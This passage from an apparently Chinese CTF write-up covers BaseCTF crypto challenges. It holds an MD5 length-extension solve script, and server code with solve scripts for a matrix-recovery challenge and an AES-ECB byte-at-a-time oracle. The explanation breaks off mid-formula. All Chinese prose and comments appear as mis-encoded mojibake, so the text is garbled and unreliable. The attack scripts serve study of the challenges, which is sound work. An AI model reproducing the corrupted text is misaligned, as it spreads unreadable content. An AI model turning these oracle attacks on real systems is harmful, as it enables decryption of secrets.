class="hljs-string">&#x27;&lt;16I&#x27;</span>, block)<br><br>        <span class="hljs-comment"># å¤‡ä»½å½“å‰çš„a, b, c, då€¼</span><br>        AA, BB, CC, DD = a, b, c, d<br>        <span class="hljs-comment"># è¿›è¡Œå››è½®æ“ä½œï¼Œæ¯è½®16æ­¥</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= i &lt;= <span class="hljs-number">15</span>:<br>                k, s, func = i, [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>][i % <span class="hljs-number">4</span>], F(b, c, d)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">16</span> &lt;= i &lt;= <span class="hljs-number">31</span>:<br>                k, s, func = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span>, [<span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>][i % <span class="hljs-number">4</span>], G(b, c, d)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">32</span> &lt;= i &lt;= <span class="hljs-number">47</span>:<br>                k, s, func = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>][i % <span class="hljs-number">4</span>], H(b, c, d)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">48</span> &lt;= i &lt;= <span class="hljs-number">63</span>:<br>                k, s, func = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span>, [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>][i % <span class="hljs-number">4</span>], I(b, c, d)<br><br>            temp = b + left_rotate((a + func + X[k] + T[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span>, s)<br>            a, b, c, d = d, temp &amp; <span class="hljs-number">0xFFFFFFFF</span>, b, c<br><br>        <span class="hljs-comment"># å°†ç»“æœåŠ åˆ°å½“å‰çš„a, b, c, d</span><br>        a = (a + AA) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        b = (b + BB) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        c = (c + CC) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        d = (d + DD) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-comment"># è¿”å›å“ˆå¸Œç»“æœ</span><br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&#x27;&lt;4I&#x27;</span>, a, b, c, d).<span class="hljs-built_in">hex</span>()<br><br><br>rem = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">33573</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    want_md5 = rem.recv(<span class="hljs-number">32</span>).decode()  <span class="hljs-comment"># æ¥æ”¶åŸå§‹æ•°æ®çš„md5</span><br><br>    <span class="hljs-comment"># è®¡ç®—æˆiv</span><br>    iv = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            tmp += want_md5[(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span> - (j + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span> - j * <span class="hljs-number">2</span>]<br>        iv.append(<span class="hljs-built_in">int</span>(tmp, <span class="hljs-number">16</span>))<br><br>    <span class="hljs-comment"># çˆ†ç ´é•¿åº¦</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>):<br>        rem.recvuntil(<span class="hljs-string">b&quot;Please input the secret:&quot;</span>)<br><br>        <span class="hljs-comment"># å¡«å……æ¶ˆæ¯</span><br>        payload = <span class="hljs-string">b&#x27;&#x27;</span><br>        payload_length = i * <span class="hljs-number">8</span><br>        payload += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        <span class="hljs-keyword">while</span> ((i + <span class="hljs-built_in">len</span>(payload)) * <span class="hljs-number">8</span>) % <span class="hljs-number">512</span> != <span class="hljs-number">448</span>:<br>            payload += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>        payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, payload_length)<br>        payload += <span class="hljs-string">b&#x27;naby&#x27;</span><br><br>        rem.sendline(payload)<br><br>        <span class="hljs-comment"># è®¡ç®—å¡«å……æ•°æ®åçš„æœ‰å‡ ä¸ªåˆ†ç»„ï¼Œéœ€è¦è·³è¿‡è®¡ç®—</span><br>        skip = (i + <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">4</span>) // <span class="hljs-number">64</span><br>        A, B, C, D = iv<br>        message = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">64</span> * skip) + <span class="hljs-string">b&#x27;naby&#x27;</span><br>        res = my_md5(message, A, B, C, D, skip)<br>        rem.recvuntil(<span class="hljs-string">b&quot;Please input your md5:&quot;</span>)<br>        rem.sendline(res.encode())<br>        rem.recvline()<br>        m = rem.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;correct&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(_, want_md5, i, m)<br>            <span class="hljs-keyword">break</span><br><br>rem.interactive()<br></code></pre></td></tr></table></figure><h2 id="fin"><a class="markdownIt-Anchor" href="#fin"></a> Fin</h2><h3 id="çŒœçŒœçœ‹"><a class="markdownIt-Anchor" href="#çŒœçŒœçœ‹"></a> çŒœçŒœçœ‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> os<br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">45</span><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;hello.&quot;</span>)<br><br>        m=bytes_to_long(flag)<br>        m=<span class="hljs-built_in">bin</span>(m)[<span class="hljs-number">2</span>:]<br><br>        length=<span class="hljs-built_in">len</span>(m)<br><br>        x=np.array([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m])<br>        T=np.array([[random.getrandbits(<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)] <span class="hljs-keyword">for</span> __ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br>        y=np.dot(x,T)<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">list</span>(y)).encode())<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            user_input=ast.literal_eval(<span class="hljs-variable language_">self</span>.recv().strip().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(user_input,<span class="hljs-built_in">list</span>):<br>                <span class="hljs-keyword">try</span>:<br>                    mat=np.array(user_input)<br>                    res=<span class="hljs-built_in">list</span>(np.dot(mat,T))<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-built_in">str</span>(res).encode())<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;wrong!!&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;wrong!&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>        <br><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p>çµæ„Ÿæ¥è‡ªå€Ÿnss3rdç ”ç©¶MT19937é¢˜ç›®æ—¶æƒ³å‡ºæ¥çš„ç‚¹å­ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/205861#h3-9">æµ…æMT19937ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>æœ‰æåˆ°ä¸€ä¸ªé»‘ç›’æµ‹è¯•ï¼Œé€šè¿‡çŸ©é˜µä¹˜æ³•çš„æ€§è´¨ï¼Œåˆ©ç”¨å·¦ä¹˜ä¸€ä¸ªåªæœ‰ä¸€ä¸ª1ï¼Œå…¶ä»–éƒ½ä½0çš„çŸ©é˜µï¼Œå¯ä»¥å¾—åˆ°å³çŸ©é˜µçš„æŸä¸€è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote()<br>p.recvline()<br>flag=<span class="hljs-built_in">eval</span>(p.recvline())<br>length=<span class="hljs-number">45</span>*<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br>T=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    x=[<span class="hljs-number">0</span>]*i+[<span class="hljs-number">1</span>]+[<span class="hljs-number">0</span>]*(length-<span class="hljs-number">1</span>-i)<br>    p.sendline(<span class="hljs-built_in">str</span>(x).encode())<br>    T.append(<span class="hljs-built_in">eval</span>(p.recvline()))<br>T=np.array(T)<br>t_ni=np.linalg.inv(T)<br><br>m=np.dot(flag,t_ni)<br>m=np.<span class="hljs-built_in">round</span>(m)<br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span>:<br>        flag+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag+=<span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ecbæ˜¯ä¸å®‰å…¨çš„"><a class="markdownIt-Anchor" href="#ecbæ˜¯ä¸å®‰å…¨çš„"></a> ECBæ˜¯ä¸å®‰å…¨çš„</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;the server will connect you entered to the front of flag.&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;then you will receive ciphertext(b64encode) encrypted by AES-ECB.&quot;</span>)<br><br>        key=os.urandom(<span class="hljs-number">16</span>)<br>        my_aes=AES.new(key=key,mode=AES.MODE_ECB)<br>        <span class="hljs-variable language_">self</span>.send(base64.b64encode(my_aes.encrypt(pad(flag,AES.block_size))))<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>            cin=<span class="hljs-variable language_">self</span>.recv()<br>            final=cin+flag<br>            <span class="hljs-variable language_">self</span>.send(base64.b64encode(my_aes.encrypt(pad(final,AES.block_size))))<br><br>            <br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br><br></code></pre></td></tr></table></figure><blockquote><p>çµæ„Ÿæ¥æºä¹‹å‰å›½å¤–çš„ä¸€åœºï¼Œä¹Ÿæ²¡æœ‰ç»™æºç ï¼Œç”šè‡³æ²¡æœ‰æç¤ºã€‚</p><p>åé¢åœ¨cryptohackä¸Šä¹Ÿé‡åˆ°äº†ï¼Œå°±æ‹¿æ¥å‡ºäº†ä¸€é¢˜ã€‚</p></blockquote><p>è¿™é¢˜æˆ‘ä»¬å¯ä»¥åœ¨åŸå§‹å†…å®¹å‰é¢åŠ ä¸Š ä»»æ„å†…å®¹ã€‚</p><p>é€šè¿‡æµ‹è¯•AESåŠ å¯†çš„å¯†æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“flagçš„é•¿åº¦ã€‚</p><blockquote><p>ä¹‹åæœ‰ä¸¤ç§æ–¹æ³•ï¼Œexpé‡Œéƒ½æœ‰å†™ï¼Œä½†æ˜¯ä»åå¾€å‰çˆ†ç ´flagçš„ä¹Ÿä¸ªç‚¹æˆ‘æ²¡ææ‡‚å°±å…ˆä¸è®²äº†ï¼Œåªè®²ä»å‰å¾€åçš„ã€‚</p></blockquote><p>å…ˆè®²åˆ©ç”¨åŸç†ï¼šECBæ¨¡å¼ä¸­ï¼Œç®—æ³•å¯¹æ¯ä¸€ä¸ªåˆ†ç»„è¿›è¡ŒåŠ å¯†ï¼Œä¸å‰ååˆ†ç»„æ— å…³ï¼Œå½“å¯†é’¥å›ºå®šä¹‹åï¼Œåªè¦è¿™ä¸€ä¸ªåˆ†ç»„çš„æ˜æ–‡ç›¸åŒï¼Œé‚£ä¹ˆåŠ å¯†ä¹‹åçš„å¯†æ–‡ä¹Ÿç›¸åŒã€‚</p><p>è¿™é‡Œç›´æ¥ä¸¾ä¸ªä¾‹å­ã€‚</p><p>æ¯”å¦‚flagæ˜¯BaseCTF{0123456789}ï¼Œé•¿åº¦ä¸º19.ä¸€å¼€å§‹æœåŠ¡å™¨ç»™æˆ‘ä»¬å‘é€å¯†æ–‡ï¼ˆbase64è§£å¯†ä¹‹åï¼‰ä¸º32å­—èŠ‚ï¼Œä¸ºä¸¤ä¸ªAES-ECBåˆ†ç»„ã€‚æˆ‘ä»¬ç»™æœåŠ¡å™¨ä¾æ¬¡å‘é€1-16å­—èŠ‚çš„æ•°æ®ï¼Œå‘é€ä¸€ä¸ª1å­—èŠ‚æ—¶ï¼ŒæœåŠ¡å™¨åŠ å¯†20å­—èŠ‚ï¼Œæœ€åå¯†æ–‡è¿˜æ˜¯32å­—èŠ‚ï¼›å½“å‘é€14å­—èŠ‚æ—¶ï¼ŒæœåŠ¡å™¨åŠ å¯†33å­—èŠ‚ï¼Œæœ€åå¯†æ–‡ä¸º48å­—èŠ‚ï¼Œå‘ç”Ÿäº†å˜åŒ–ï¼Œåœ¨è¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡ºflagé•¿åº¦ä¸º32-(14-1)=19ã€‚</p><p>ä¹‹ååˆ©ç”¨åˆšåˆšè®²çš„åŸç†ï¼Œæˆ‘ä»¬å‘é€flagé•¿åº¦å¡«å……åˆ°ä¸€ä¸ªAES-ECBåˆ†ç»„é•¿åº¦å‡ä¸€çš„å†…å®¹ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘ä»¬å‘é€31å­—èŠ‚çš„aï¼Œè¿™æ—¶å€™æœåŠ¡å™¨åŠ å¯†ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi mathvariant="normal">âˆ£</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>B</mi><mi mathvariant="normal">âˆ£</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>0123456789</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaa|aaaaaaaaaaaaaaB|aseCTF\{0123456789\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord">âˆ£</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">âˆ£</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>ä¹‹åæˆ‘ä»¬çˆ†ç ´flagçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå°‘å‘é€ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™æ—¶å€™æœåŠ¡å™¨åŠ å¯†ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi mathvariant="normal">âˆ£</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mo stretchy="false">?</mo><mi mathvariant="normal">âˆ£</mi><mi>B</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>0123456789</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaa|aaaaaaaaaaaaaaa?|BaseCTF\{0123456789\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord">âˆ£</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mclose">?</span><span class="mord">âˆ£</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" 